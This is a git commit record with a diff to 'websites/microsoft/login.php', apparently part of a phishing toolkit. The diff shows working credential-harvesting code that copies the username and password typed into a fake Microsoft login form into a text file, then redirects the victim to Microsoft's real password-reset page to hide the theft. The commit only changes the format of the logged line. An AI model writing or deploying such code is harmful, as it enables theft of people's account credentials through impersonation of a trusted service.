e7aa65987a2cba5dd6a091aa956e0ce4c7944e28
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 19:06:20 +0600

    Update login.php

--- websites/microsoft/login.php
+++ websites/microsoft/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Microsoft :- username : " . $_POST['loginfmt'] . "  || Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
 header('Location: https://account.live.com/ResetPassword.aspx');
 exit();
